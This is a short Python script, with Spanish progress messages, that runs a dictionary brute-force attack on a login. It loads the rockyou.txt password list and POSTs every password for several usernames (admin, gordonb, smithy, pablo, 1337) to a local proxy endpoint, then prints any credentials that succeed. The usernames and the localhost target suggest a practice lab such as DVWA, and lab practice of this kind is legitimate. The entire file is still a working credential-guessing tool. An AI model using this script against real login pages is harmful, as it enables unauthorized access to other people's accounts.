import requests
import time

def fast_brute_force():
    proxy_url = "http://127.0.0.1:9999/test"
    
    users = ['admin', 'gordonb', 'smithy', 'pablo', '1337']
    
    try:
        with open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"Contraseñas cargadas: {len(passwords)}")
    except Exception as e:
        print(f"Error cargando rockyou.txt: {e}")
        return
    
    found = []
    total_attempts = 0
    start_time = time.time()
    
    for user in users:
        print(f"Usuario: {user}")
        user_found = False
        user_attempts = 0
        
        for i, pwd in enumerate(passwords):
            if user_found:
                break
                
            total_attempts += 1
            user_attempts += 1
            
            if user_attempts % 1000 == 0:
                elapsed = time.time() - start_time
                speed = total_attempts / elapsed
                remaining = len(passwords) - user_attempts
                eta = remaining / speed if speed > 0 else 0
                print(f"  Progreso: {user_attempts}/{len(passwords)} - "
                      f"Velocidad: {speed:.1f} intentos/seg - "
                      f"ETA: {eta/60:.1f} min")
            
            try:
                response = requests.post(
                    proxy_url,
                    data={'username': user, 'password': pwd},
                    timeout=3
                )
                
                if response.text.strip() == 'SUCCESS':
                    print(f"  {user}:{pwd} - VALIDO")
                    found.append((user, pwd))
                    user_found = True
                
            except Exception as e:
                if "Connection" in str(e):
                    time.sleep(1)
            
            if i % 10 != 0:
                time.sleep(0.05)
    
    total_time = time.time() - start_time
    print(f"\nTiempo total: {total_time/60:.1f} minutos")
    print(f"Velocidad: {total_attempts/total_time:.1f} intentos/segundo")
    
    if found:
        print("\nCREDENCIALES VALIDAS ENCONTRADAS:")
        for user, pwd in found:
            print(f"  {user}:{pwd}")
    else:
        print("\nNo se encontraron credenciales validas")
    
    return found

if __name__ == "__main__":
    fast_brute_force()